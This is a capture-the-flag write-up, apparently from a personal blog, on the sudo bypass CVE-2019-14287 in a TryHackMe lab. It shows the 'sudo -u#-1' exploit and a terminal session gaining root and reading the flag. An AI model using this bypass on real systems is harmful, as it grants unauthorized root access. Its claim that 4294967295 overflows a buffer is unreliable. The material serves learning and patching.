---
title: Sudo - Security Bypass (CVE:2019-14287)
author: Dimitrios Tsarouchas
date: 2021-01-23 20:55:00 +0800
categories: [CTFs, TryHackMe]
tags: [ctf, tryhackme, CVE-2019-14287]
pin: true
image: https://cdn.pixabay.com/photo/2013/07/13/12/31/penguin-159784_960_720.png
---

![Kenobi](https://cdn.pixabay.com/photo/2013/07/13/12/31/penguin-159784_960_720.png)

## Introduction

In this post we are going to exploit a vulnerability found in the `sudo` program by Joe Vennix in 2019. This vulnerability has been patched in newer versions of Linux but it may still be found in versions 1.8.27 and before. In the practical part we are going to use a machine from the TryHackMe room [Sudo Security Bypass](https://tryhackme.com/room/sudovulnsbypass){:target="_blank"}.  

### What is sudo?

In Linux operating systems `sudo` (or Super User DO) allows a permitted user to execute a command as the superuser or another user, as specified by the security policy ([sudo.ws](https://www.sudo.ws/man/1.8.3/sudo.man.html){:target="_blank"}). A user can automatically inherit the permissons of the binary's owner (root) if will execute the binary with setuid permissions. Setuid permits users to run certain programs with esclated privilege ([computerhope.com](https://www.computerhope.com/jargon/s/setuid.htm#:~:text=Setuid%2C%20which%20stands%20for%20set,certain%20programs%20with%20escalated%20privileges.){:target="_blank"}).

## CVE-2019-14287 

The [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287){:target="_blank"} vulnerability gives to a local user or a program the ability  to execute commands as a superuser. 

In a Linux system a user can execute programs as other users by specifying their **UID** using the command `sudo -u#id <command>`. 

Even though root access from a local user is prohibited in the `/etc/sudoers` configuration file, Joe Vennix managed to bypass it by finding a flaw in the previous command. 

#### Lets understand it with the following example

We have a local user called Bob and we want to grant extra permissions to him and let him execute a program as if he is any other user but not the root user.

We will do this by configuring the `/etc/sudoers` file and adding the following line:
```terminal
Bob ALL=(ALL:!root) NOPASSWD: ALL
```
Adding the previous line to sudoers file will let Bob exexute any command as another user and prevent him from executing commands as the superuser (root). In some vulnerable versions of `sudo` we can bypass this restriction and execute commands with root privileges. By entering the user id equal to 0 (root UID) in the previous command it wouldn't work because we are not allowed to execute commands as the root user [exploit-db.com](https://www.exploit-db.com/exploits/47502){:target="_blank"}. 

According to Joe Vennix's findings there are two values that Sudo incorrectly read them as being 0 which is the root UID:

- -1
- 4294967295

Even though the sudoers file has been configured to restrict us from executing commands as root, by passing any of these two values in the user ID will give us root privileges.

```terminal
sudo -u#-1 <command>

or

sudo -u#4294967295 <command>
```

**There are two aspects of this vulnerability:**


When a UID of -1 is provided:
The binary interprets this as a request for no change in the user id, but since sudo is already executing with root privileges, it gives the user root access upon execution.

When a UID of 4294967295 is provided:
This large number causes the buffer for the sudo binary to be overflowed, since the defined range has its maximum limit for 10000; the buffer overflows and sudo processes the given integer as a request for no change in the user id, but since sudo executes with root permissions, after execution the system call gives root access.

Source: [datacellsolutions.com](https://datacellsolutions.com/2019/11/29/the-sudo-security-bypass-bug/){:target="_blank"}

## Exploting sudo

We will SSH into the ThryHackMe machine on port 2222 and try to escalate our privileges from a normal user to the root.

The credentials are already provided below:

- Username: tryhackme
- Password: tryhackme

```terminal
# ssh -p 2222 tryhackme@10.10.47.156                                       
The authenticity of host '[10.10.47.156]:2222 ([10.10.47.156]:2222)' can't be established.
ECDSA key fingerprint is SHA256:p8qxMPPV/x0AsbdLybMXoOPRBUR07uTTrEzgrZWuHKU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[10.10.47.156]:2222' (ECDSA) to the list of known hosts.
tryhackme@10.10.47.156's password: tryhackme 
Last login: Fri Feb  7 00:14:41 2020 from 192.168.1.151
tryhackme@sudo-privesc:~$ whoami
tryhackme
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash      

tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash
root@sudo-privesc:~# whoami
root
root@sudo-privesc:~# pwd
/home/tryhackme
root@sudo-privesc:~# cat /root/root.txt
THM{l33t_s3cur1ty_bypass}

```

When we first connected to the remote machine and used the `whoami` command we found that we are the **tryhackme** user. 


Then we checked what commands we are allowed to run with sudo using the `sudo -l` command. 

As we can see above we are not allowed to run the `/bin/bash` file as the root user. The system administrator has configured the `/etc/sudoers` file with the instruction `(ALL, !root) NOPASSWD: /bin/bash` to prevent us from executing `/bin/bash` as superusers. 


Unfortunatelly for him the sudo version this machine is using is vulnerable and we are going to exploit it to get root privileges.
We will become root users using the `sudo -u#-1 /bin/bash` command. 


After the successfull execution of the command, using once more the `whoami` we can see that the name of the user is root, and we can also see that the shell has changed from `tryhackme@sudo-privesc:~$` to `root@sudo-privesc:~#`.

In order to find the **root.txt** flag which is stored under the `/root` folder we type `cat /root/root.txt` and since we are the root user we get the flag. 




